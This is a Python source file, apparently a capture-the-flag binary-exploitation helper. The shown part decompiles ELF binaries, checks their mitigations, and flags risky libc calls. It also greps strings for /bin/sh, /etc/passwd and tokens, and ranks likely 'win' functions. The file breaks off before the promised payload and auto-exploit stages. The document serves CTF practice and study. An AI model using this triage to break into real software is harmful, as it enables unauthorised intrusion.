#!/usr/bin/env python3
"""
auto_pwn.py — Binary identifier + angr decompiler + vuln classifier
              + payload suggester + silent auto-exploit.

Usage:
    python3 auto_pwn.py ./bank
    python3 auto_pwn.py ./bank -d main,win
    python3 auto_pwn.py ./bank --backend angr
    python3 auto_pwn.py ./bank --no-autoexploit
    python3 auto_pwn.py --list-backends
    python3 auto_pwn.py                    # interactive
"""

import sys, os, re, argparse, subprocess, time, shutil, logging

# =============================================================
# Silence angr
# =============================================================
logging.getLogger('angr').setLevel(logging.CRITICAL)
logging.getLogger('claripy').setLevel(logging.CRITICAL)
logging.getLogger('cle').setLevel(logging.CRITICAL)
logging.getLogger('pyvex').setLevel(logging.CRITICAL)


# =============================================================
# Silence pwntools during probing
# =============================================================
def _silence_pwntools():
    try:
        from pwnlib.log import getLogger as _pwntools_logger
        _pwntools_logger().setLevel('critical')
    except Exception:
        pass
    for name in ('pwnlib', 'pwnlib.tubes', 'pwnlib.tubes.process',
                 'pwnlib.tubes.remote', 'pwnlib.elf', 'pwnlib.rop',
                 'pwnlib.util', 'pwnlib.log',
                 'angr', 'claripy', 'cle', 'pyvex'):
        lg = logging.getLogger(name)
        lg.setLevel(logging.CRITICAL)
        lg.propagate = False
        lg.disabled = True
    logging.disable(logging.CRITICAL)


def _unsilence_pwntools():
    logging.disable(logging.NOTSET)
    for name in ('pwnlib', 'pwnlib.tubes', 'pwnlib.tubes.process',
                 'pwnlib.tubes.remote', 'pwnlib.elf', 'pwnlib.rop',
                 'pwnlib.util', 'pwnlib.log'):
        lg = logging.getLogger(name)
        lg.disabled = False
        lg.propagate = True


# =============================================================
# Colors
# =============================================================
class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
    B = '\033[94m'; M = '\033[95m'; CY = '\033[96m'
    W = '\033[97m'; BOLD = '\033[1m'; DIM = '\033[2m'; RST = '\033[0m'


def no_color():
    for a in dir(C):
        if not a.startswith('_'):
            setattr(C, a, '')


# =============================================================
# Safe read
# =============================================================
def read_text(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read()
    except UnicodeDecodeError:
        with open(path, 'rb') as f:
            return f.read().decode('latin-1')
    except Exception:
        return ''


# =============================================================
# Backend detection
# =============================================================
def detect_backends():
    avail = {'angr': False, 'objdump': shutil.which('objdump') is not None}
    try:
        import angr  # noqa
        avail['angr'] = True
    except ImportError:
        avail['angr'] = False
    return avail


# =============================================================
# angr decompiler
# =============================================================
def angr_fallback_pseudocode(project, func):
    lines = [f'void {func.name}(void) {{']
    try:
        blocks = sorted(func.blocks, key=lambda b: b.addr)
    except Exception:
        blocks = list(func.blocks)
    for block in blocks:
        lines.append(f'    /* block @ {hex(block.addr)} */')
        try:
            irsb = project.factory.block(block.addr).vex
            for stmt in irsb.statements:
                lines.append(f'    /*   {stmt} */')
        except Exception:
            lines.append('    /* (unreadable block) */')
    lines.append('}')
    return '\n'.join(lines)


def decompile_angr(binary, funcs=None):
    try:
        import angr
        import logging as _lg
        for n in ('angr', 'claripy', 'cle', 'pyvex'):
            _lg.getLogger(n).setLevel(_lg.CRITICAL)
    except ImportError:
        return '/* angr not installed */'
    try:
        p = angr.Project(binary, auto_load_libs=False)
        cfg = p.analyses.CFGFast(normalize=True)
    except Exception as e:
        return f'/* angr project/CFG failed: {e} */'

    func_by_name = {}
    func_by_addr = {}
    for fn in cfg.kb.functions.values():
        func_by_name[fn.name] = fn
        func_by_addr[fn.addr] = fn

    def _resolve(name):
        if name in func_by_name:
            return func_by_name[name]
        if '?' in name:
            suffix = name.split('?', 1)[1]
            if suffix in func_by_name:
                return func_by_name[suffix]
        if name.startswith('0x'):
            try:
                addr = int(name, 16)
                if addr in func_by_addr:
                    return func_by_addr[addr]
            except ValueError:
                pass
        m = re.match(r'^sub_([0-9a-fA-F]+)$', name)
        if m:
            try:
                addr = int(m.group(1), 16)
                if addr in func_by_addr:
                    return func_by_addr[addr]
            except ValueError:
                pass
        return None

    targets = []
    seen_addrs = set()
    if funcs:
        for name in funcs:
            fn = _resolve(name)
            if fn and fn.addr not in seen_addrs:
                targets.append(fn)
                seen_addrs.add(fn.addr)

    for fn in cfg.kb.functions.values():
        if fn.is_simprocedure or fn.is_plt:
            continue
        if fn.addr in seen_addrs:
            continue
        targets.append(fn)
        seen_addrs.add(fn.addr)

    if not targets:
        return '/* no matching functions found */'

    out = []
    for fn in targets:
        out.append(f'/* ==== {fn.name} @ {hex(fn.addr)} ==== */')
        decompiled = False
        try:
            dec = p.analyses.Decompiler(fn, cfg=cfg)
            if dec.codegen and dec.codegen.text:
                out.append(dec.codegen.text); decompiled = True
            else:
                out.append('/* angr: no codegen produced */')
        except Exception as e:
            out.append(f'/* angr decompile failed: {e} */')
        if not decompiled:
            try:
                out.append('/* ----- fallback pseudocode ----- */')
                out.append(angr_fallback_pseudocode(p, fn))
            except Exception as e2:
                out.append(f'/* fallback failed: {e2} */')
        out.append('')
    return '\n'.join(out)


# =============================================================
# objdump fallback
# =============================================================
def decompile_objdump(binary, funcs=None):
    cmd = ['objdump', '-d', '-M', 'intel']
    if funcs and len(funcs) == 1:
        cmd.append('--disassemble=' + funcs[0])
    cmd.append(binary)
    try:
        disasm = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode(
            errors='replace')
    except Exception as e:
        return f'/* objdump failed: {e} */'
    lines = []; indent = '    '; depth = 0
    for raw in disasm.splitlines():
        line = raw.strip()
        if not line: continue
        m = re.match(r'^([0-9a-f]+)\s+<([^>]+)>:', line)
        if m:
            lines.append(f'\n/* ==== {m.group(2)} @ 0x{m.group(1)} ==== */')
            lines.append(f'void {m.group(2)}(void) {{')
            depth = 1; continue
        m = re.match(r'^\s*[0-9a-f]+:\s+(?:[0-9a-f]{2}\s+)+\s*(.+)$', raw)
        if not m: continue
        ins = m.group(1).strip()
        if re.match(r'^ret', ins) or re.match(r'^leave', ins):
            if depth > 0: lines.append(indent * depth + 'return;'); depth -= 1
            continue
        cm = re.search(r'call\s+[0-9a-f]+\s+<([^>]+)>', ins)
        if cm:
            lines.append(indent * depth + f'{cm.group(1).split("@")[0]}();')
            continue
        if 'syscall' in ins:
            lines.append(indent * depth + 'syscall();'); continue
        sm = re.match(r'sub\s+rsp,\s*(0x[0-9a-f]+)', ins)
        if sm:
            lines.append(indent * depth + f'char buf[{sm.group(1)}];'); continue
        lines.append(indent * depth + f'/* {ins} */')
    if depth > 0: lines.append('}')
    return '\n'.join(lines)


def decompile(binary, funcs=None, backend='auto'):
    avail = detect_backends()

    if backend == 'objdump':
        if avail['objdump']:
            return decompile_objdump(binary, funcs), 'objdump'
        return '/* no decompiler backend available */', 'none'

    if avail['angr']:
        result = decompile_angr(binary, funcs)
        bad_markers = (
            'angr not installed',
            'angr project/CFG failed',
            'no matching functions',
            'angr decompile failed',
        )
        if result.strip() and not any(m in result for m in bad_markers):
            return result, 'angr'

    if avail['objdump']:
        return decompile_objdump(binary, funcs), 'objdump'
    return '/* no decompiler backend available */', 'none'


# =============================================================
# File info / security
# =============================================================
def file_info(path):
    try:
        out = subprocess.check_output(['file', '-b', path]).decode().strip()
    except Exception:
        out = ''
    return {
        'raw': out,
        'arch': 'x86-64' if '64-bit' in out else ('i386' if '32-bit' in out else '?'),
        'bits': 64 if '64-bit' in out else (32 if '32-bit' in out else 0),
        'static': 'statically linked' in out,
        'stripped': ('not stripped' not in out) and ('stripped' in out),
        'pie': 'pie executable' in out or 'shared object' in out,
    }


def security(path):
    sec = {'canary': False, 'nx': False, 'pie': False,
           'relro': 'No', 'fortify': False, 'static': False}
    try:
        r = subprocess.check_output(['readelf', '-W', '-l', path],
                                    stderr=subprocess.DEVNULL).decode()
        for line in r.splitlines():
            if 'GNU_STACK' in line:
                sec['nx'] = 'RWE' not in line
        if 'GNU_RELRO' in r:
            sec['relro'] = 'Partial'
    except Exception:
        pass
    try:
        r = subprocess.check_output(['readelf', '-W', '-s', path],
                                    stderr=subprocess.DEVNULL).decode()
        if '__stack_chk_fail' in r or '__stack_chk_guard' in r:
            sec['canary'] = True
        if '__printf_chk' in r or '__sprintf_chk' in r:
            sec['fortify'] = True
    except Exception:
        pass
    try:
        r = subprocess.check_output(['readelf', '-W', '-h', path],
                                    stderr=subprocess.DEVNULL).decode()
        sec['pie'] = 'DYN' in r
    except Exception:
        pass
    try:
        d = subprocess.check_output(['readelf', '-W', '-d', path],
                                    stderr=subprocess.DEVNULL).decode()
        if 'BIND_NOW' in d:
            sec['relro'] = 'Full'
    except Exception:
        pass
    try:
        f = subprocess.check_output(['file', '-b', path]).decode()
        sec['static'] = 'statically linked' in f
    except Exception:
        pass
    return sec


# =============================================================
# Internal-symbol exclusion regex
# =============================================================
INTERNAL_FUNC_RE = re.compile(
    r'_dl_|__do_global|__libc_csu|^_init$|^_fini$|'
    r'__libc_start|register_tm|deregister_tm|frame_dummy|'
    r'^_start$|__gmon_start__|__x86\.get_pc_thunk|__cxa_|_ITM_|'
    r'@plt$|@plt\+|^_\.|^__libc_|^_IO_|^_obstack',
    re.I
)


def _is_section_header_name(name):
    if not name:
        return False
    if name.startswith('.'):
        return True
    return name in ('.text', '.init', '.fini', '.plt', '.plt.sec', '.plt.got',
                    '.data', '.bss', '.rodata', '.comment', '.eh_frame')


# =============================================================
# Seccomp constants
# =============================================================
SECCOMP_FUNCS = {
    'seccomp_init', 'seccomp_rule_add', 'seccomp_rule_add_array',
    'seccomp_rule_add_exact', 'seccomp_rule_add_exact_array',
    'seccomp_load', 'seccomp_release', 'seccomp_export_bpf',
}

_SECCOMP_NR_MAP = {
    0: 'read', 1: 'write', 2: 'open', 3: 'close',
    9: 'mmap', 10: 'mprotect', 11: 'munmap',
    22: 'pipe', 32: 'dup', 33: 'dup2',
    59: 'execve', 60: 'exit', 231: 'exit_group',
    257: 'openat', 262: 'newfstatat', 158: 'arch_prctl',
    157: 'prctl', 12: 'brk', 25: 'mremap',
    0x101: 'openat',
}


# =============================================================
# API catalog
# =============================================================
DANGEROUS = {
    'printf': 'FMT_STRING', 'fprintf': 'FMT_STRING', 'sprintf': 'FMT_STRING',
    'snprintf': 'FMT_STRING', 'vprintf': 'FMT_STRING', 'vfprintf': 'FMT_STRING',
    'vsprintf': 'FMT_STRING', 'vsnprintf': 'FMT_STRING', 'syslog': 'FMT_STRING',
    'dprintf': 'FMT_STRING', 'vdprintf': 'FMT_STRING',
    'gets': 'OVERFLOW_CRITICAL',
    'strcpy': 'OVERFLOW', 'strcat': 'OVERFLOW',
    'scanf': 'OVERFLOW', 'sscanf': 'OVERFLOW', 'fscanf': 'OVERFLOW',
    'vscanf': 'OVERFLOW', 'vsscanf': 'OVERFLOW', 'vfscanf': 'OVERFLOW',
    'memcpy': 'OVERFLOW_MAYBE', 'memmove': 'OVERFLOW_MAYBE',
    'strncpy': 'OVERFLOW_MAYBE', 'strncat': 'OVERFLOW_MAYBE',
    'read': 'OVERFLOW_MAYBE', 'recv': 'OVERFLOW_MAYBE',
    'recvfrom': 'OVERFLOW_MAYBE', 'pread': 'OVERFLOW_MAYBE',
    '__isoc99_scanf': 'OVERFLOW', '__isoc99_sscanf': 'OVERFLOW',
    '__isoc99_fscanf': 'OVERFLOW', '__isoc99_vscanf': 'OVERFLOW',
    '__isoc99_vsscanf': 'OVERFLOW', '__isoc99_vfscanf': 'OVERFLOW',
    '__isoc99_printf': 'FMT_STRING', '__isoc99_fprintf': 'FMT_STRING',
    '__isoc99_sprintf': 'FMT_STRING', '__isoc99_snprintf': 'FMT_STRING',
    '__isoc99_vprintf': 'FMT_STRING', '__isoc99_vfprintf': 'FMT_STRING',
    '__isoc99_vsprintf': 'FMT_STRING', '__isoc99_vsnprintf': 'FMT_STRING',
    '__isoc23_scanf': 'OVERFLOW', '__isoc23_sscanf': 'OVERFLOW',
    '__isoc23_fscanf': 'OVERFLOW',
    '__gets_chk': 'OVERFLOW_CRITICAL', '__strcpy_chk': 'OVERFLOW',
    '__strcat_chk': 'OVERFLOW', '__sprintf_chk': 'OVERFLOW',
    '__snprintf_chk': 'OVERFLOW', '__memcpy_chk': 'OVERFLOW_MAYBE',
    '__memset_chk': 'OVERFLOW_MAYBE', '__read_chk': 'OVERFLOW_MAYBE',
    '__printf_chk': 'FMT_STRING', '__fprintf_chk': 'FMT_STRING',
    '__vprintf_chk': 'FMT_STRING', '__vfprintf_chk': 'FMT_STRING',
    '__vsnprintf_chk': 'FMT_STRING',
    'system': 'CMD_EXEC', 'popen': 'CMD_EXEC', 'execve': 'CMD_EXEC',
    'execl': 'CMD_EXEC', 'execlp': 'CMD_EXEC', 'execle': 'CMD_EXEC',
    'execv': 'CMD_EXEC', 'execvp': 'CMD_EXEC', 'execvpe': 'CMD_EXEC',
    'malloc': 'HEAP', 'free': 'HEAP', 'realloc': 'HEAP', 'calloc': 'HEAP',
    'memalign': 'HEAP', 'aligned_alloc': 'HEAP', 'posix_memalign': 'HEAP',
    'mprotect': 'PROT', 'mmap': 'PROT', 'mmap64': 'PROT',
    'fgets': 'INPUT', 'fread': 'INPUT',
    'puts': 'OUTPUT', 'fputs': 'OUTPUT', 'write': 'OUTPUT', 'fwrite': 'OUTPUT',
    'open': 'FILE', 'open64': 'FILE', 'fopen': 'FILE', 'fopen64': 'FILE',
    'creat': 'FILE', 'unlink': 'FILE', 'remove': 'FILE', 'rename': 'FILE',
    'chmod': 'FILE',
    'ptrace': 'DEBUG',
    'alarm': 'TIME', 'setitimer': 'TIME',
    'fork': 'FORK', 'vfork': 'FORK',
    'signal': 'SIGNAL', 'sigaction': 'SIGNAL',
    'raise': 'SIGNAL', 'kill': 'SIGNAL',
    'socket': 'NET', 'connect': 'NET',
    'pthread_create': 'THREAD', 'clone': 'THREAD',
    'atoi': 'CONVERT', 'atol': 'CONVERT', 'strtol': 'CONVERT',
    'strtoul': 'CONVERT', 'strtoll': 'CONVERT', 'strtoull': 'CONVERT',
    'getenv': 'ENV', 'setenv': 'ENV',
    'dlopen': 'DL', 'dlsym': 'DL',
    'seccomp_init': 'SECCOMP', 'seccomp_rule_add': 'SECCOMP',
    'seccomp_rule_add_array': 'SECCOMP', 'seccomp_load': 'SECCOMP',
    'seccomp_release': 'SECCOMP', 'seccomp_export_bpf': 'SECCOMP',
}

HINTS = {
    'FMT_STRING': 'Format string — verify first arg is a literal',
    'OVERFLOW': 'No bounds check — buffer overflow',
    'OVERFLOW_CRITICAL': 'Unbounded read — classic stack overflow',
    'OVERFLOW_MAYBE': 'Check size argument vs destination',
    'CMD_EXEC': 'Command execution',
    'HEAP': 'Heap operation — UAF/double-free risk',
    'PROT': 'Memory protection change',
    'INPUT': 'Input function', 'OUTPUT': 'Output function',
    'FILE': 'File operations — path traversal?',
    'DEBUG': 'Anti-debug', 'TIME': 'Timeout',
    'FORK': 'Fork — canary brute-force possible',
    'SIGNAL': 'Signal handling',
    'NET': 'Network operations',
    'THREAD': 'Threading — race conditions',
    'CONVERT': 'String→int — integer overflow',
    'ENV': 'Environment access',
    'DL': 'Dynamic loading',
    'SECCOMP': 'Seccomp syscall filter — restricts what shellcode can do',
}


def _normalize_import(name):
    name = name.split('@')[0]
    if name.startswith('__isoc99_'):
        name = name[len('__isoc99_'):]
    if name.startswith('__isoc23_'):
        name = name[len('__isoc23_'):]
    m = re.match(r'^__(\w+)_chk$', name)
    if m:
        base = m.group(1)
        if base in ('strcpy', 'strcat', 'sprintf', 'snprintf',
                    'memcpy', 'memset', 'gets', 'printf',
                    'fprintf', 'vprintf', 'vfprintf', 'vsprintf',
                    'vsnprintf', 'read'):
            return base
    return name


# =============================================================
# Imported / defined functions
# =============================================================
def imported_functions(path):
    funcs = set()

    try:
        r = subprocess.check_output(['readelf', '-W', '--dyn-syms', path],
                                    stderr=subprocess.DEVNULL).decode(errors='replace')
        _KW = {'FUNC', 'OBJECT', 'NOTYPE', 'SECTION', 'FILE',
               'GLOBAL', 'LOCAL', 'WEAK',
               'DEFAULT', 'HIDDEN', 'PROTECTED', 'INTERNAL',
               'UND', 'UNIQUE', 'IFUNC', 'Base', 'ABS', 'COM'}
        for line in r.splitlines():
            parts = line.split()
            if 'FUNC' not in parts:
                continue
            for tok in parts:
                if tok in _KW:
                    continue
                if re.match(r'^[A-Za-z_]\w*', tok):
                    name = tok.split('@')[0]
                    if name and name not in _KW:
                        funcs.add(name)
                    break
    except Exception:
        pass

    if not funcs:
        try:
            r = subprocess.check_output(['objdump', '-T', path],
                                        stderr=subprocess.DEVNULL).decode(errors='replace')
            for line in r.splitlines():
                m = re.search(r'\*UND\*\s+\S+\s+(\S+)', line)
                if m:
                    name = m.group(1).split('@')[0]
                    if name and name != 'Base':
                        funcs.add(name)
        except Exception:
            pass

    if not funcs:
        try:
            r = subprocess.check_output(['nm', '-D', path],
                                        stderr=subprocess.DEVNULL).decode(errors='replace')
            for line in r.splitlines():
                parts = line.split()
                if len(parts) >= 2 and parts[-2] in ('U', 'w', 'v'):
                    funcs.add(parts[-1].split('@')[0])
        except Exception:
            pass

    if not funcs:
        try:
            r = subprocess.check_output(['objdump', '-d', path],
                                        stderr=subprocess.DEVNULL).decode(errors='replace')
            for m in re.finditer(r'call\s+[0-9a-f]+\s+<([^@>+]+)@plt>', r):
                funcs.add(m.group(1))
        except Exception:
            pass

    if not funcs:
        for section in ('.dynstr', '.strtab', '.rodata'):
            try:
                r = subprocess.check_output(
                    ['readelf', '-W', '-p', section, path],
                    stderr=subprocess.DEVNULL).decode(errors='replace')
                for name in re.findall(r'\b([a-z_][a-z0-9_]{2,30})\b', r):
                    if name in DANGEROUS:
                        funcs.add(name)
            except Exception:
                pass

    normalized = set()
    for f in funcs:
        normalized.add(f)
        normalized.add(_normalize_import(f))
    return normalized


def defined_functions(path):
    funcs = []
    try:
        r = subprocess.check_output(['nm', '-C', path],
                                    stderr=subprocess.DEVNULL).decode()
        for line in r.splitlines():
            parts = line.split()
            if len(parts) >= 3 and parts[1].upper() in ('T', 't', 'W', 'w'):
                try:
                    funcs.append((parts[2], int(parts[0], 16)))
                except ValueError:
                    pass
    except Exception:
        pass
    if funcs:
        return funcs

    try:
        r = subprocess.check_output(['readelf', '-W', '-s', path],
                                    stderr=subprocess.DEVNULL).decode(errors='replace')
        for line in r.splitlines():
            m = re.match(
                r'\s*\d+:\s+([0-9a-f]+)\s+\d+\s+FUNC\s+\S+\s+\S+\s+\d+\s+(\S+)$',
                line)
            if m:
                addr = int(m.group(1), 16)
                name = m.group(2)
                if addr and name and name != 'UND':
                    funcs.append((name, addr))
    except Exception:
        pass
    if funcs:
        return funcs

    try:
        r = subprocess.check_output(['objdump', '-t', path],
                                    stderr=subprocess.DEVNULL).decode(errors='replace')
        for line in r.splitlines():
            m = re.match(
                r'^([0-9a-f]+)\s+\S+\s+F\s+\.text\s+\S+\s+\S+\s+(\S+)$', line)
            if m:
                funcs.append((m.group(2), int(m.group(1), 16)))
    except Exception:
        pass
    if funcs:
        return funcs

    try:
        r = subprocess.check_output(['objdump', '-d', path],
                                    stderr=subprocess.DEVNULL).decode(errors='replace')
        for m in re.finditer(r'^([0-9a-f]+)\s+<([^>]+)>:', r, re.MULTILINE):
            funcs.append((m.group(2), int(m.group(1), 16)))
    except Exception:
        pass
    return funcs


def scan_strings(path):
    out = []
    try:
        r = subprocess.check_output(['strings', '-a', '-n', '4', path],
                                    stderr=subprocess.DEVNULL).decode(errors='replace')
        for line in r.splitlines():
            if re.search(
                r'/bin/sh|/bin/bash|/bin/cat|'
                r'flag|win|secret|/proc/self|%p|%n|%s|/etc/passwd|'
                r'/flag|root:|admin|password|token|key|address|jump|'
                r'fl4g|fl@g|fla9|'
                r'\.txt$|\.flag$|\.log$|\.bin$',
                line, re.I
            ):
                out.append(line)
    except Exception:
        pass
    return out


def scan_decompiled_for_apis(decompiled_text):
    apis = set()
    for m in re.finditer(r'\b([A-Za-z_][\w]*)\s*\(', decompiled_text):
        name = m.group(1)
        base = _normalize_import(name)
        if base in DANGEROUS or name in DANGEROUS or name in (
            'puts', 'fgets', 'fread', 'malloc', 'free',
            'memset', 'strlen', 'strcmp', 'atoi', 'exit',
            'read', 'write', 'system', 'gets', 'printf',
            'scanf', 'strcpy', 'strncpy', 'strncmp',
            'memcpy', 'memmove', 'open', 'fopen', 'fork',
            'signal', 'alarm', 'syscall', 'execve', 'popen',
            'seccomp_init', 'seccomp_rule_add', 'seccomp_load'):
            apis.add(name)
            apis.add(base)
    return apis


# =============================================================
# angr-output helpers
# =============================================================
def _extract_functions_from_angr(decompiled_text):
    funcs = []
    for m in re.finditer(
            r'/\*\s*=*\s*([A-Za-z_]\w*)\s*@\s*(0x[0-9a-f]+)\s*=*\s*\*/',
            decompiled_text):
        try:
            funcs.append((m.group(1), int(m.group(2), 16)))
        except ValueError:
            pass
    return funcs


def _extract_sub_calls(decompiled_text):
    subs = set()
    for m in re.finditer(r'\b(sub_[0-9a-fA-F]+)\s*\(', decompiled_text):
        subs.add(m.group(1))
    return subs


# ---- NEW: filter boring functions from stripped binaries ----
_INTERESTING_APIS_RE = re.compile(
    r'\b(printf|fprintf|sprintf|snprintf|vprintf|syslog|'
    r'gets|strcpy|strcat|scanf|sscanf|fscanf|__isoc99_scanf|'
    r'__isoc23_scanf|memcpy|memmove|read|recv|strncpy|strncat|'
    r'system|popen|execve|execl|execvp|'
    r'malloc|free|realloc|calloc|'
    r'mprotect|mmap|'
    r'fgets|fread|puts|fputs|write|fwrite|'
    r'open|fopen|creat|unlink|remove|rename|chmod|'
    r'ptrace|fork|vfork|signal|sigaction|'
    r'seccomp_init|seccomp_rule_add|seccomp_load|'
    r'__libc_start_main|__stack_chk_fail|'
    r'strcmp|strlen|strtol|strtoul|atoi|atol|fflush|exit)\s*\(', re.I)


def _is_interesting_function(body):
    """Return True if a decompiled function body is worth showing."""
    if not body:
        return False

    # (1) Interesting API call
    if _INTERESTING_APIS_RE.search(body):
        return True

    # (2) Control flow
    if re.search(r'\b(if|while|for|switch|goto|case)\b', body):
        return True

    # (3) Substantive body (> 3 code lines)
    code_lines = []
    for line in body.splitlines():
        s = line.strip()
        if not s or s in ('{', '}') or s.startswith('/*') or s.startswith('//'):
            continue
        code_lines.append(s)
    if len(code_lines) > 3:
        return True

    # (4) Success/flag strings
    if re.search(r'you\s+win|congrat|correct|flag', body, re.I):
        return True

    return False


def _filter_decompiled_for_stripped(decompiled_text):
    """Return only interesting functions from a stripped decompile dump."""
    if not decompiled_text:
        return decompiled_text

    parts = []
    header_re = re.compile(
        r'/\*\s*=*\s*([A-Za-z_]\w*)\s*@\s*(0x[0-9a-f]+)\s*=*\s*\*/')

    matches = list(header_re.finditer(decompiled_text))
    if not matches:
        return decompiled_text

    for i, m in enumerate(matches):
        name = m.group(1)
        start = m.start()
        end = matches[i + 1].start() if i + 1 < len(matches) else len(decompiled_text)
        body = decompiled_text[start:end]

        # Keep if name is meaningful (not a sub_XXXX / section header)
        if not re.match(r'^(sub_|_start|\.)', name):
            parts.append(body)
            continue
        if name == 'main':
            parts.append(body)
            continue
        if _is_interesting_function(body):
            parts.append(body)
    return '\n'.join(parts)


# =============================================================
# PATTERN RECOGNITION — main / win heuristics
# =============================================================
def get_disasm_blocks(path):
    try:
        text = subprocess.check_output(
            ['objdump', '-d', '-M', 'intel', path],
            stderr=subprocess.DEVNULL
        ).decode(errors='replace')
    except Exception:
        return {}, ''
    blocks = {}
    cur = None
    for line in text.splitlines():
        m = re.match(r'^([0-9a-f]+)\s+<([^>]+)>:', line)
        if m:
            cur = (m.group(2), int(m.group(1), 16))
            blocks[cur] = []
        elif cur is not None:
            blocks[cur].append(line)
    return blocks, text


def get_callers_map(blocks):
    callers = {}
    for (_, addr), lines in blocks.items():
        for line in lines:
            m = re.search(r'call\s+([0-9a-f]+)\s+<([^>]+)>', line)
            if m:
                try:
                    tgt = int(m.group(1), 16)
                    callers.setdefault(tgt, []).append(addr)
                except ValueError:
                    pass
    return callers


def get_start_main_arg(path, blocks):
    start_block = None
    for (name, addr), lines in blocks.items():
        if name == '_start':
            start_block = lines
            break
    if not start_block:
        try:
            r = subprocess.check_output(['readelf', '-W', '-h', path],
                                        stderr=subprocess.DEVNULL).decode()
            m = re.search(r'Entry point address:\s+(0x[0-9a-f]+)', r)
            if m:
                entry = int(m.group(1), 16)
                for (name, addr), lines in blocks.items():
                    if addr == entry:
                        start_block = lines
                        break
        except Exception:
            pass
    if not start_block:
        return None

    for i, line in enumerate(start_block):
        if '__libc_start_main' in line:
            for j in range(max(0, i - 12), i):
                prev = start_block[j]
                tgt = re.search(r'#\s*([0-9a-f]+)', prev)
                if tgt:
                    try:
                        return int(tgt.group(1), 16)
                    except ValueError:
                        pass
                m = re.search(r'mov\s+rdi,\s*0x([0-9a-f]+)', prev)
                if m:
                    return int(m.group(1), 16)
    return None


def get_text_symbols(path):
    syms = {}
    for sec in ('--dyn-syms', '--syms'):
        try:
            r = subprocess.check_output(['readelf', '-W', sec, path],
                                        stderr=subprocess.DEVNULL).decode(errors='replace')
            for line in r.splitlines():
                m = re.match(
                    r'\s*\d+:\s+([0-9a-f]+)\s+\d+\s+FUNC\s+\S+\s+\S+\s+\d+\s+(\S+)$',
                    line)
                if m:
                    addr = int(m.group(1), 16)
                    name = m.group(2)
                    if addr and name and name != 'UND':
                        syms[name] = addr
        except Exception:
            pass
    return syms


def find_main_candidate(path, blocks, strings_found, imports):
    candidates = []
    callers = get_callers_map(blocks)
    start_main = get_start_main_arg(path, blocks)

    for (name, addr), lines in blocks.items():
        if _is_section_header_name(name):
            continue
        score = 0
        reasons = []
        body = '\n'.join(lines)

        if start_main is not None and addr == start_main:
            score += 20
            reasons.append('passed to __libc_start_main by _start')

        if name == 'main':
            score += 50
            reasons.append('symbol name is main')

        if addr not in callers:
            score += 2
            reasons.append('not called by anyone')

        if re.search(r'call.*<(puts|printf)@plt>', body):
            score += 1
            reasons.append('calls puts/printf')

        if re.search(r'call.*<(gets|fgets|scanf|__isoc99_scanf|__isoc23_scanf)@plt>', body):
            score += 2
            reasons.append('calls input function')

        n_puts = len(re.findall(r'call.*<(puts|printf)@plt>', body))
        if n_puts >= 2:
            score += 1
            reasons.append(f'multiple puts/printf ({n_puts})')

        if re.search(r'start|init|fini|tm_clones|frame_dummy|plt', name, re.I):
            score -= 10

        n_ins = sum(1 for l in lines if re.match(r'\s*[0-9a-f]+:', l))
        if n_ins < 5:
            score -= 3

        if score > 0:
            candidates.append((name, addr, score, '; '.join(reasons)))

    if not candidates and start_main is not None:
        return (f'sub_{start_main:x}', start_main, 20,
                'passed to __libc_start_main by _start')

    candidates.sort(key=lambda x: -x[2])
    if candidates:
        return candidates[0]
    return (None, None, 0, '')


def find_win_candidates(path, blocks, strings_found, imports):
    candidates = []
    callers = get_callers_map(blocks)
    string_addrs = {'/bin/sh': []}
    try:
        r = subprocess.check_output(['objdump', '-s', '-j', '.rodata', path],
                                    stderr=subprocess.DEVNULL).decode(errors='replace')
        for line in r.splitlines():
            m = re.match(r'\s*([0-9a-f]+)\s+([0-9a-f ]+)\s+(.*)', line)
            if m:
                addr = int(m.group(1), 16)
                ascii_part = m.group(3)
                if '/bin/sh' in ascii_part:
                    string_addrs['/bin/sh'].append(addr)
    except Exception:
        pass

    for (name, addr), lines in blocks.items():
        if _is_section_header_name(name):
            continue
        if INTERNAL_FUNC_RE.search(name):
            continue
        if '@plt' in name:
            continue

        score = 0
        reasons = []
        body = '\n'.join(lines)

        if re.search(r'win|flag|shell|secret|backdoor|get_flag|admin|pwn',
                     name, re.I):
            score += 50
            reasons.append(f'symbol matches win-like: "{name}"')

        for fn in ('system', 'popen', 'execve', 'execvp', 'execl', 'execv'):
            if re.search(rf'call.*<{fn}@plt>', body):
                score += 10
                reasons.append(f'calls {fn}()')

        for fn in ('fopen', 'open', 'fread', 'fgets'):
            if re.search(rf'call.*<{fn}@plt>', body):
                score += 8
                reasons.append(f'calls {fn}()')
                break

        if '/bin/sh' in body:
            score += 15
            reasons.append('references /bin/sh')
        else:
            for sh_addr in string_addrs['/bin/sh']:
                if hex(sh_addr) in body or f'{sh_addr:x}' in body.lower():
                    score += 15
                    reasons.append('references /bin/sh (by addr)')
                    break

        if re.search(r'flag', body, re.I):
            score += 5
            reasons.append('references flag')

        if re.search(r'you\s+win|congrat|correct|success',
                     body, re.I):
            score += 5
            reasons.append('references win/flag string')

        n_ins = sum(1 for l in lines if re.match(r'\s*[0-9a-f]+:', l))
        if n_ins < 20:
            score += 3
            reasons.append(f'small ({n_ins} insns)')
        elif n_ins > 100:
            score -= 3

        if addr not in callers:
            score += 2
            reasons.append('never called')

        for caller_addr in callers.get(addr, []):
            for (cn, ca), _ in blocks.items():
                if ca == caller_addr and cn == 'main':
                    score -= 5
                    reasons.append('called by main')
                    break

        if re.search(r'call.*<(printf|puts|scanf|fgets|gets)@plt>', body):
            score -= 2
        if re.search(r'main|start|init|fini|tm_clones|frame', name, re.I):
            score -= 20

        strong_evidence = (
            re.search(r'win|flag|shell|secret|backdoor|get_flag|admin|pwn',
                      name, re.I)
            or any(re.search(rf'call.*<{fn}@plt>', body)
                   for fn in ('system', 'popen', 'execve', 'execv',
                               'execl', 'execvp', 'open', 'fopen',
                               'read', 'fread', 'fgets'))
            or '/bin/sh' in body
            or re.search(r'flag', body, re.I)
            or re.search(r'you\s+win|congrat|correct|success', body, re.I)
        )

        if score >= 10 and strong_evidence:
            candidates.append((name, addr, score, '; '.join(reasons)))

    candidates.sort(key=lambda x: -x[2])
    return candidates


# =============================================================
# Smart decompile filter
# =============================================================
_INTERNAL_DECOMPILE_RE = re.compile(
    r'@plt|@plt-|'
    r'^\.|'
    r'_dl_|__do_global|__libc_csu|^_init$|^_fini$|'
    r'register_tm|deregister_tm|frame_dummy|^_start$|'
